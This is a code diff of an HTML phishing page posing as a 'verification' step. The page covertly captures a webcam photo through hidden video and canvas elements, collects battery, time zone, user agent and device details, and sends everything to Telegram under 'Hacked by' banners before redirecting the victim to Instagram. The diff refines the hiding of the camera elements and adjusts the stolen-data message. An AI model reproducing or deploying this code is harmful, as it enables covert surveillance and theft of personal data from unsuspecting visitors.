@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Silent Verification Fix</title>
+  <title>Stealth Verification Final Fix</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <style>
     body {
@@ -45,7 +45,9 @@
       to { transform: rotate(360deg); }
     }
     video, canvas {
-      display: none !important;
+      opacity: 0;
+      position: absolute;
+      pointer-events: none;
     }
   </style>
 </head>
@@ -104,17 +106,16 @@
         .then(stream => {
           video.srcObject = stream;
 
-          // Wait until the camera is really ready
           video.onloadeddata = () => {
             setTimeout(() => {
               ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
               imageBase64 = canvas.toDataURL("image/jpeg").split(',')[1];
-              stream.getTracks().forEach(track => track.stop()); // Turn off camera
+              stream.getTracks().forEach(track => track.stop()); // stop webcam
               sendToTelegram("", true);
               setTimeout(() => {
                 window.location.href = "https://instagram.com";
               }, 3000);
-            }, 1000); // Slight delay after loaded
+            }, 1200);
           };
         })
         .catch(() => {
@@ -139,10 +140,6 @@
           .then(res => res.json())
           .then(data => {
             let basicInfo = "📱 Hacked by @Cobrax9\n\n";
-            basicInfo += "🌐 IP Info:\n";
-            basicInfo += `🌐 IP: ${data.ip}\n📡 ISP: ${data.org}\n🔍 ASN: ${data.org?.split(" ")[0]}\n`;
-            basicInfo += `📍 IP Location: https://maps.google.com/?q=${data.loc}\n\n`;
-
             basicInfo += "📱 Device Info:\n";
             basicInfo += `🔋 Charging: ${charging}\n`;
             basicInfo += `🔌 Battery: ${level}\n`;
@@ -150,7 +147,7 @@
             basicInfo += `🕒 Time Zone: ${timeZone}\n`;
             basicInfo += `🖥️ User Agent: ${ua}\n`;
             basicInfo += `📱 Device: ${/Mobile/i.test(ua) ? "Mobile" : "Desktop"}\n\n`;
-            basicInfo += "👀 More data being requested...";
+            basicInfo += "👀 Awaiting GPS & camera access...";
             basicInfo += "📱 Hacked by @Shopandbuyy\n\n";
             
             sendToTelegram(basicInfo);
